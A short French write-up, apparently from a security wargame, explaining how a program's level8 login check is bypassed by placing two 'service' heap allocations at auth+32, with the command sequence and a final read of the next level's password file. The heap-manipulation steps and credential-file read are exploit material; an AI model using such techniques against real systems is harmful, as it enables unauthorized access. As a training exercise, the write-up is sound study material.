On constate qu'afin d'obtenir notre shell (et donc notre mot de passe), nous devons invalider la condition suivante : `*(int *)(auth + 32) == 0`. Le programme gere la heap manuellement via auth, reset, service et login.

--> Le programme alloue auth avec `malloc(4)`, mais lit 32 octets plus loin lors du login. Il suffit donc de placer des donnees non nulles a auth + 32 grace aux allocations `service`.

```shell
./level8
# (nil), (nil)
auth a
# 0x804a008, (nil) <-- auth alloue en 0x804a008
service a
# 0x804a008, 0x804a018 <-- 1er strdup -> +16
service a
# 0x804a008, 0x804a028 <-- 1eme strdup -> +32
login
whoami
cat /home/user/level9/.pass
```

--> `0x804a008 - 0x804a028 = 0x20 = 32` : Apres 2 `service`, le chunk tombe exactement sur auth + 32.


--> Nous avons donc notre mot de passe pour le level 9 !

